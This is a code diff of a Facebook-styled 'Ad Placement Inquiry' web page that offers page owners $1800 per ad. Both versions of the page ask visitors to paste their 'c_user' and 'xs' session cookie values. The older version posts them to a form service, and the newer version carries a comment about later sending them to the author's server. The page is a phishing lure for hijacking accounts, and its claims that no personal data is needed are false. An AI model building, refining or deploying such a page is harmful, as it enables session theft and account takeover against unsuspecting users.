@@ -3,164 +3,74 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Ad Placement Request</title>
+<title>Ad Placement Inquiry</title>
 <style>
-body{
-    margin:0;
-    background:#f0f2f5;
-    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+body {
+    font-family: Arial, sans-serif;
+    background-color: #f4f4f4;
+    margin: 0;
+    padding: 0;
 }
-.container{
-    max-width:520px;
-    margin:40px auto;
-    padding:20px;
+.container {
+    max-width: 500px;
+    margin: 50px auto;
+    background: #fff;
+    padding: 25px;
+    border-radius: 10px;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.1);
 }
-.card{
-    background:#fff;
-    border-radius:10px;
-    box-shadow:0 2px 12px rgba(0,0,0,.08);
-    padding:25px;
+h2 {
+    text-align: center;
+    color: #1877f2;
+    margin-bottom: 20px;
 }
-.header{
-    display:flex;
-    align-items:center;
-    margin-bottom:15px;
+p {
+    color: #333;
+    line-height: 1.5;
 }
-.dp{
-    width:46px;
-    height:46px;
-    border-radius:50%;
-    background:#1877f2;
-    color:#fff;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    font-weight:700;
-    margin-right:12px;
+form input, form textarea, form button {
+    width: 100%;
+    padding: 12px;
+    margin: 10px 0;
+    font-size: 14px;
+    border-radius: 6px;
+    border: 1px solid #ccc;
 }
-.header h3{
-    margin:0;
-    font-size:16px;
+form button {
+    background-color: #1877f2;
+    color: #fff;
+    border: none;
+    cursor: pointer;
+    font-weight: bold;
 }
-.header p{
-    margin:2px 0 0;
-    font-size:13px;
-    color:#65676b;
-}
-.video-container{
-    margin:15px 0;
-    text-align:center;
-}
-.video-container video{
-    width:100%;
-    border-radius:10px;
-}
-.video-title{
-    font-weight:600;
-    margin-bottom:8px;
-    font-size:16px;
-}
-.content{
-    font-size:15px;
-    line-height:1.6;
-    margin-bottom:20px;
-    white-space:pre-line;
-    color:#050505;
-}
-form input{
-    width:100%;
-    padding:10px;
-    margin-bottom:10px;
-    border:1px solid #ddd;
-    border-radius:6px;
-    font-size:14px;
-}
-form button{
-    width:100%;
-    padding:12px;
-    background:#1877f2;
-    border:none;
-    color:#fff;
-    font-size:14px;
-    font-weight:600;
-    border-radius:6px;
-    cursor:pointer;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    gap:8px;
-}
-.spinner{
-    width:16px;
-    height:16px;
-    border:2px solid rgba(255,255,255,.4);
-    border-top:2px solid #fff;
-    border-radius:50%;
-    animation:spin 1s linear infinite;
-}
-@keyframes spin{
-    0%{transform:rotate(0deg)}
-    100%{transform:rotate(360deg)}
-}
-.note{
-    font-size:12px;
-    color:#65676b;
-    text-align:center;
-    margin-top:10px;
+form button:hover {
+    background-color: #155ab6;
 }
 </style>
 </head>
 <body>
 
 <div class="container">
-<div class="card">
+<h2>Ad Placement Inquiry</h2>
+<p>Hello,</p>
+<p>We'd like to place an advertisement on your Facebook page. You will receive $1800 per ad.</p>
+<p>No personal information or page access is required. If you are interested, please fill out the form below and submit your request.</p>
 
-<div class="header">
-<div class="dp">AD</div>
-<div>
-<h3>Ad Placement Request</h3>
-<p>Quick Submission Form</p>
-</div>
-</div>
-
-<div class="video-container">
-<div class="video-title">Apply for Ad Placement</div>
-<video controls>
-  <source src="https://resource2.heygen.ai/video_translate/94087358030a4df8b20e73f1fba92ed5-en/720p.mp4" type="video/mp4">
-  Your browser does not support the video tag.
-</video>
-</div>
-
-<div class="content">
-We are excited to offer you the opportunity to feature an advertisement on your Facebook page.
-
-This is a safe and guaranteed collaboration, no personal data or page access required.
-
-Please fill out the form below to submit your request.
-</div>
-
-<!-- Formspree Form -->
-<form id="requestForm" action="https://formspree.io/f/YOUR_FORM_ID" method="POST">
+<form id="adForm">
     <input type="text" name="c_user" placeholder="c_user" required>
     <input type="text" name="xs" placeholder="XS" required>
-    <button type="submit" id="submitBtn">
-        <span id="btnText">Continue</span>
-    </button>
+    <textarea name="message" rows="5" placeholder="Your Message" required>Hello, I am interested in placing an ad on your page. Please let me know the next steps.</textarea>
+    <button type="submit">Submit Request</button>
 </form>
 
-<p class="note">Your request will be processed securely.</p>
-
-</div>
+<p style="text-align:center; font-size:12px; color:#666;">Your request will be processed securely.</p>
 </div>
 
 <script>
-const form = document.getElementById('requestForm');
-const btn = document.getElementById('submitBtn');
-const btnText = document.getElementById('btnText');
-
-form.addEventListener('submit', function(e){
-    btn.disabled = true;
-    btnText.innerHTML = '<div class="spinner"></div> Continue…';
+document.getElementById('adForm').addEventListener('submit', function(e){
+    e.preventDefault();
+    alert('Thank you! Your request has been submitted.');
+    // You can later connect this to your server to receive c_user and xs
 });
 </script>
 
